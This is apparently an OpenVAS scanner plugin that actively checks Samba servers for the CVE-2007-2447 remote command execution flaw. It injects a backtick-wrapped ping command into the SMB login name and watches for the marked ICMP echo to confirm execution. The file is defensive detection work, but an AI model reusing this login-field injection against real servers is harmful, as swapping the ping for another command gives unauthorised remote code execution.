###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_samba_23972_active.nasl 10398 2018-07-04 12:11:48Z cfischer $
#
# Samba MS-RPC Remote Shell Command Execution Vulnerability (Active Check)
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (c) the respective author(s)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:samba:samba";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108011");
  script_version("$Revision: 10398 $");
  script_cve_id("CVE-2007-2447");
  script_bugtraq_id(23972);
  script_tag(name:"cvss_base", value:"6.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-07-04 14:11:48 +0200 (Wed, 04 Jul 2018) $");
  script_tag(name:"creation_date", value:"2016-10-31 11:47:00 +0200 (Mon, 31 Oct 2016)");
  script_name("Samba MS-RPC Remote Shell Command Execution Vulnerability (Active Check)");
  script_copyright("Copyright (c) 2016 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Gain a shell remotely");
  script_dependencies("smb_nativelanman.nasl");
  script_require_ports(139, 445);
  script_mandatory_keys("samba/smb/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/23972");
  script_xref(name:"URL", value:"https://www.samba.org/samba/security/CVE-2007-2447.html");

  script_tag(name:"summary", value:"Samba is prone to a vulnerability that allows attackers to execute arbitrary shell
  commands because the software fails to sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Send a crafted command to the samba server and check for a remote command execution.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary shell commands on an affected
  system with the privileges of the application.");

  script_tag(name:"solution", value:"Updates are available. Please see the referenced vendor advisory.");

  script_tag(name:"affected", value:"This issue affects Samba 3.0.0 to 3.0.25rc3.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("smb_nt.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); #To have a reference to the Detection-NVT

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

name = kb_smb_name();
if( ! name ) name = "*SMBSERVER";

r = smb_session_request( soc:soc, remote:name );
if( ! r ) exit( 0 );

check = "_OpenVAS_" + rand_str( length:6 ); # -p in the ping command only allows up to 16 bytes
pattern = hexstr( check );

# Vulnerable samba versions are executing the command passed via login
# smb_session_setup() takes a good amount of time so using 50 ping requests here
login = '`ping -p ' + pattern + ' -c50 ' + this_host() + '`';

#nb: With NTLMSSP_AUTH the login name will be converted to "toupper()" in smb_nt.inc
#Because of this the ping command will fail so using cleartext login for now
#prot = smb_neg_prot( soc:soc );
#if( ! prot ) exit( 0 );
#smb_session_setup( soc:soc, login:login, password:"", domain:"", prot:prot );
smb_session_setup_cleartext( soc:soc, login:login, password:"", domain:"" );

max = 50; # Amount of ping requests used in the login above

while( res = send_capture( socket:soc, data:"", pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) ) ) {

  count++;
  data = get_icmp_element( icmp:res, element:"data" );

  if( check >< data ) {
    close( soc );
    security_message( port:port );
    exit( 0 );
  }
  if( count > max ) break;
}

close( soc );
exit( 99 );
